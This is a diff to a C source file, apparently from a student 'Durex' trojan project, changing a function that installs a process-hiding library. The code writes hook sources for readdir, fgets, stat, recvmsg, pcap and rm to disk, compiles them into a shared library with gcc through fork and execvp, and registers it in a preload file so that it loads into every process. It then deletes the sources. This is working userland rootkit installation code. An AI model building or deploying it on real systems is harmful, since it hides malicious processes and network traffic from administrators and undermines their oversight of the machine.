@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
-/*   Updated: 2018/08/28 21:35:51 by root             ###   ########.fr       */
+/*   Updated: 2018/08/31 09:27:54 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,51 +14,57 @@
 #include <stdlib.h>
 /* remove */
 #include <stdio.h>
+/* execvp */
+#include <unistd.h>
+/* waitpid */
+#include <sys/types.h>
+#include <sys/wait.h>
 
 #include "main.h"
 
-static char *mystrcpy(char *s1, const char *s2)
-{
-	int		i = 0;
-
-	while (s2[i]) {
-		s1[i] = s2[i];
-		i++;
-	}
-	s1[i] = '\0';
-	return s1;
-}
-
 int				install_library()
 {
-	const char	*files[] = { DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
+	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
+							 DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
 							 DUREX_PCAP_FILE, DUREX_READDIR_FILE, DUREX_RECVMSG_FILE,
-							 DUREX_RM_FILE, DUREX_XSTAT_FILE };
-	const char	*src[] = { DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
-						   DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
-						   DUREX_RM_SRC, DUREX_XSTAT_SRC };
-	char		cmd[1024];
+							 DUREX_RM_FILE, DUREX_XSTAT_FILE,
+							 "-ldl", NULL };
+	char	*const src[] = { NULL, NULL, NULL, NULL, NULL, NULL,
+							 DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
+							 DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
+							 DUREX_RM_SRC, DUREX_XSTAT_SRC };
 	int			fd;
 	size_t		ret;
+	pid_t		pid;
 
-	for (size_t i = 0; i < sizeof(files) / sizeof(*files); i++) {
+	serverLog("[INFO] - Creating library files...");
+	for (size_t i = 0; i < sizeof(src) / sizeof(*src); i++) {
+		if (!src[i])
+			continue ;
 		fd = open(files[i], O_CREAT | O_TRUNC | O_WRONLY, 0644);
 		if (fd < 0)
 			return 0;
-		serverLog("[INFO] - Installing %s...", files[i]);
 		ret = write(fd, src[i], mystrlen(src[i]));
 		close(fd);
 		if (ret != (size_t)mystrlen(src[i]))
 			return 0;
 	}
-	mystrcpy(cmd, "gcc -Wall -fPIC -shared -o ");
-	mystrcpy(cmd + mystrlen(cmd), DUREX_PROCESSHIDER_LIB);
-	for (size_t i = 0; i < sizeof(files) / sizeof(*files); i++) {
-		mystrcpy(cmd + mystrlen(cmd), " ");
-		mystrcpy(cmd + mystrlen(cmd), files[i]);
+	pid = fork();
+	if (pid == 0) {
+		serverLog("[INFO] - Compiling library...");
+		execvp(files[0], files);
+		exit(-1);
+	} else if (pid > 0) {
+		int			status;
+		waitpid(pid, &status, 0);
+		if (!WIFEXITED(status)) {
+			serverLog("[ERRO] - %d %d", status, WEXITSTATUS(status));
+			return 0;
+		}
+	} else {
+		return 0;
 	}
-	mystrcpy(cmd + mystrlen(cmd), " -ldl");
-	system(cmd);
+	serverLog("[INFO] - Installing library...");
 	ret = 0;
 	fd = open(DUREX_PRELOAD, O_CREAT | O_TRUNC | O_WRONLY, 0600);
 	if (fd >= 0) {
@@ -67,8 +73,11 @@ int				install_library()
 		if (ret != sizeof(DUREX_PROCESSHIDER_LIB))
 			ret = 0;
 	}
-	for (size_t i = 0; i < sizeof(files) / sizeof(*files); i++)
-		remove(files[i]);
+	for (size_t i = 0; i < sizeof(src) / sizeof(*src); i++) {
+		if (src[i])
+			remove(files[i]);
+	}
+	serverLog("[INFO] - Library well placed.");
 	return ret;
 }
 
